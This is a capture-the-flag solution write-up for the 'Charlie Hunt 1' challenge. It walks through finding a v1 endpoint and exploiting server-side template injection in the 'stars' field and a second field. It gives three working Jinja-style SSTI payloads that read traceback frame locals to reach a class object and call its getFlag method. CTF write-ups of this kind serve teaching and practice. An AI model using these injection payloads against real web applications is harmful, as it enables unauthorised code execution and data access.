# Charlie Hunt 1 Solution

Player need to first find the v1 endpoint. From there they will be able to insert ssti payloads in the 'stars' field. When they input anything that is not a number, an error pops up which shows that error class name is REDACTED<br>

The error message mentions that they need to submit info to the developer and the **v is unknown.
They need to use the **v field and use this second payload field to get the class object and from there the flag method which will print the flag.

To find the Class object name:

```
{{e|attr('__traceback__')|attr('tb_frame')|attr('f_locals')}}
```

You find the object name as `RateProcOb`

To find the methods in the class:

```
{{((e|attr('__traceback__')|attr('tb_frame')|attr('f_locals'))['RateProcOb']|attr('__class__')|attr('__mro__'))[0]|attr('__dict__')|attr('keys')()}}
```

You find all the methods in the class out of which getFlag stands out<br>
Running the method using the payload below shows the flag

```
{{(e|attr('__traceback__')|attr('tb_frame')|attr('f_locals'))['RateProcOb']|attr('getFlag')()}}
```
